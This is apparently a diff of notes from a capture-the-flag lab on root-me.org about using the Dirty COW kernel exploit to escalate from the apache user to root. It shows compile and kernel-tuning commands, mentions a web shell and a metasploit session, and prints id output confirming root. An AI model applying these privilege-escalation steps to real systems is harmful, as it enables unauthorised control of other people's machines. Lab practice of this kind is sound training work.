@@ -227,13 +227,15 @@ after many tries, this dirtyc0w exploit seemed promising (i.e, it didn't crash t
 
 using https://www.exploit-db.com/exploits/40616/
 
+
+on cgitelnet.pl shell:
 fix up the exploit with appropirate settings (-pthread, set payload to x86) and use
 [admin@ctf03.root-me.org /tmp]$ echo 0 > /proc/sys/vm/dirty_writeback_centisecs
-[admin@ctf03.root-me.org /tmp]$ gcc cowroot.c -o cowroot -pthread
 
 finally found an exploit that compiles. oddly enough this would crash the VM a lot of times before 
 I got it to work....
 
+on metasploit shell:
 
 id
 uid=48(apache) gid=48(apache) groups=48(apache)
@@ -253,7 +255,7 @@ thread stopped
 id
 uid=0(root) gid=48(apache) groups=0(root),48(apache)
 
-boom! finally
+boom! 
 
 
 
